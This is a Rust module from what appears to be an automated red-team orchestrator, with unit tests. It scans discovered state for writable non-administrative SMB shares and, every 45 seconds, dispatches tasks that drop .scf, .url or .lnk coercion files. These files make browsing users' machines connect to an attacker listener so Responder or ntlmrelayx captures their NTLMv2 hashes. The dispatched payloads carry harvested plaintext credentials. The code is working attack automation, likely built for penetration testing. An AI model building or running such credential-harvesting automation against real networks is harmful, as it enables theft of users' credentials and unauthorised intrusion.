//! auto_share_coercion -- drop coercion files (.scf, .url, .lnk) on writable
//! shares to capture NTLMv2 hashes via Responder/ntlmrelayx.
//!
//! When a user browses to a share containing one of these files, Windows
//! automatically connects back to the attacker-controlled listener, leaking the
//! user's NTLMv2 hash. This is a passive credential harvesting technique.
//!
//! Requires: writable shares discovered by share_enum, a listener IP for the
//! UNC path in the coercion file, and Responder running on the listener.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Collect share coercion work items from current state.
///
/// Pure logic extracted from `auto_share_coercion` so it can be unit-tested
/// without needing a `Dispatcher` or async runtime. Returns at most 3 items
/// per call to avoid flooding the dispatcher.
fn collect_share_coercion_work(state: &StateInner, listener: &str) -> Vec<ShareCoercionWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    let cred = match state.credentials.first() {
        Some(c) => c.clone(),
        None => return Vec::new(),
    };

    state
        .shares
        .iter()
        .filter(|s| {
            let perms = s.permissions.to_uppercase();
            perms == "WRITE" || perms == "READ/WRITE" || perms.contains("WRITE")
        })
        .filter(|s| {
            // Skip default admin/system shares
            let name_upper = s.name.to_uppercase();
            !matches!(
                name_upper.as_str(),
                "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
            )
        })
        .filter(|s| {
            let dedup_key = format!("{}:{}", s.host, s.name);
            !state.is_processed(DEDUP_WRITABLE_SHARES, &dedup_key)
        })
        .map(|s| ShareCoercionWork {
            host: s.host.clone(),
            share_name: s.name.clone(),
            listener: listener.to_string(),
            credential: cred.clone(),
        })
        .take(3) // limit per cycle to avoid flooding
        .collect()
}

/// Monitors for writable shares and dispatches coercion file drops.
/// Interval: 45s.
pub async fn auto_share_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("share_coercion") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue, // need listener for UNC path in coercion files
        };

        let work: Vec<ShareCoercionWork> = {
            let state = dispatcher.state.read().await;
            collect_share_coercion_work(&state, &listener)
        };

        for item in work {
            let payload = json!({
                "technique": "share_coercion",
                "target_ip": item.host,
                "share_name": item.share_name,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("share_coercion");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.host,
                        share = %item.share_name,
                        "Share coercion file drop dispatched"
                    );

                    let dedup_key = format!("{}:{}", item.host, item.share_name);
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_WRITABLE_SHARES, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_WRITABLE_SHARES, &dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(
                        host = %item.host,
                        share = %item.share_name,
                        "Share coercion task deferred by throttler"
                    );
                }
                Err(e) => {
                    warn!(
                        err = %e,
                        host = %item.host,
                        share = %item.share_name,
                        "Failed to dispatch share coercion"
                    );
                }
            }
        }
    }
}

struct ShareCoercionWork {
    host: String,
    share_name: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::orchestrator::state::StateInner;
    use ares_core::models::{Credential, Share};

    fn make_credential(username: &str, password: &str, domain: &str) -> Credential {
        Credential {
            id: format!("c-{username}"),
            username: username.into(),
            password: password.into(), // pragma: allowlist secret
            domain: domain.into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_share(host: &str, name: &str, permissions: &str) -> Share {
        Share {
            host: host.into(),
            name: name.into(),
            permissions: permissions.into(),
            comment: String::new(),
            authenticated_as: None,
        }
    }

    #[test]
    fn dedup_key_format() {
        let key = format!("{}:{}", "192.168.58.22", "Users");
        assert_eq!(key, "192.168.58.22:Users");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_WRITABLE_SHARES, "writable_shares");
    }

    #[test]
    fn admin_shares_filtered() {
        let admin_shares = ["C$", "ADMIN$", "IPC$", "PRINT$", "SYSVOL", "NETLOGON"];
        for name in &admin_shares {
            let name_upper = name.to_uppercase();
            assert!(
                matches!(
                    name_upper.as_str(),
                    "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
                ),
                "{name} should be filtered"
            );
        }
    }

    #[test]
    fn non_admin_shares_pass() {
        let user_shares = ["Users", "Public", "Data", "shared"];
        for name in &user_shares {
            let name_upper = name.to_uppercase();
            assert!(
                !matches!(
                    name_upper.as_str(),
                    "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
                ),
                "{name} should pass through"
            );
        }
    }

    #[test]
    fn writable_permission_matching() {
        let writable = ["WRITE", "READ/WRITE", "rw WRITE access"];
        for p in &writable {
            let perms = p.to_uppercase();
            let is_writable = perms == "WRITE" || perms == "READ/WRITE" || perms.contains("WRITE");
            assert!(is_writable, "{p} should be writable");
        }
    }

    #[test]
    fn readonly_permission_rejected() {
        let readonly = ["READ", "NONE", "DENIED"];
        for p in &readonly {
            let perms = p.to_uppercase();
            let is_writable = perms == "WRITE" || perms == "READ/WRITE" || perms.contains("WRITE");
            assert!(!is_writable, "{p} should NOT be writable");
        }
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "share_coercion",
            "target_ip": "192.168.58.22",
            "share_name": "Users",
            "listener_ip": "192.168.58.50",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "share_coercion");
        assert_eq!(payload["target_ip"], "192.168.58.22");
        assert_eq!(payload["share_name"], "Users");
        assert_eq!(payload["listener_ip"], "192.168.58.50");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn admin_share_filtering_lowercase_variations() {
        let lower_admin_shares = ["c$", "admin$", "ipc$", "print$", "sysvol", "netlogon"];
        for name in &lower_admin_shares {
            let name_upper = name.to_uppercase();
            assert!(
                matches!(
                    name_upper.as_str(),
                    "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
                ),
                "{name} (lowercase) should be filtered after uppercasing"
            );
        }
    }

    #[test]
    fn writable_permission_with_change_keyword() {
        let perm = "CHANGE";
        let perms = perm.to_uppercase();
        let is_writable = perms == "WRITE" || perms == "READ/WRITE" || perms.contains("WRITE");
        assert!(!is_writable, "CHANGE alone should not match WRITE logic");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "testuser".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = ShareCoercionWork {
            host: "192.168.58.22".into(),
            share_name: "Data".into(),
            listener: "192.168.58.50".into(),
            credential: cred,
        };

        assert_eq!(work.host, "192.168.58.22");
        assert_eq!(work.share_name, "Data");
        assert_eq!(work.listener, "192.168.58.50");
        assert_eq!(work.credential.username, "testuser");
        assert_eq!(work.credential.domain, "contoso.local");
    }

    #[test]
    fn per_cycle_limit_of_three() {
        let shares: Vec<String> = (0..10).map(|i| format!("Share{i}")).collect();
        let limited: Vec<&String> = shares.iter().take(3).collect();
        assert_eq!(limited.len(), 3);
        assert_eq!(*limited[0], "Share0");
        assert_eq!(*limited[2], "Share2");
    }

    #[test]
    fn empty_share_name_handling() {
        let name = "";
        let name_upper = name.to_uppercase();
        assert!(
            !matches!(
                name_upper.as_str(),
                "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
            ),
            "Empty share name should pass admin filter"
        );
    }

    #[test]
    fn case_insensitive_admin_share_check() {
        let mixed_case = ["Sysvol", "NetLogon", "Admin$", "Ipc$"];
        for name in &mixed_case {
            let name_upper = name.to_uppercase();
            assert!(
                matches!(
                    name_upper.as_str(),
                    "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
                ),
                "{name} should be filtered regardless of case"
            );
        }
    }

    #[test]
    fn collect_empty_state_returns_no_work() {
        let state = StateInner::new("test-op".into());
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_credentials_returns_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .shares
            .push(make_share("192.168.58.22", "Users", "WRITE"));
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_shares_returns_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_writable_share_produces_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Users", "WRITE"));
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].host, "192.168.58.22");
        assert_eq!(work[0].share_name, "Users");
        assert_eq!(work[0].listener, "192.168.58.50");
        assert_eq!(work[0].credential.username, "admin");
    }

    #[test]
    fn collect_readonly_share_skipped() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Users", "READ"));
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_admin_shares_filtered() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "ADMIN$", "WRITE"));
        state
            .shares
            .push(make_share("192.168.58.22", "C$", "WRITE"));
        state
            .shares
            .push(make_share("192.168.58.22", "IPC$", "WRITE"));
        state
            .shares
            .push(make_share("192.168.58.22", "SYSVOL", "WRITE"));
        state
            .shares
            .push(make_share("192.168.58.22", "NETLOGON", "WRITE"));
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_skips_already_processed() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Users", "WRITE"));
        state.mark_processed(DEDUP_WRITABLE_SHARES, "192.168.58.22:Users".into());
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_limits_to_three_per_cycle() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        for i in 0..5 {
            state
                .shares
                .push(make_share("192.168.58.22", &format!("Share{i}"), "WRITE"));
        }
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 3);
    }

    #[test]
    fn collect_read_write_permission_produces_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Data", "READ/WRITE"));
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].share_name, "Data");
    }

    #[tokio::test]
    async fn collect_via_shared_state() {
        let shared = SharedState::new("test-op".into());
        {
            let mut state = shared.write().await;
            state
                .credentials
                .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
            state
                .shares
                .push(make_share("192.168.58.22", "Public", "WRITE"));
        }
        let state = shared.read().await;
        let work = collect_share_coercion_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].host, "192.168.58.22");
    }
}
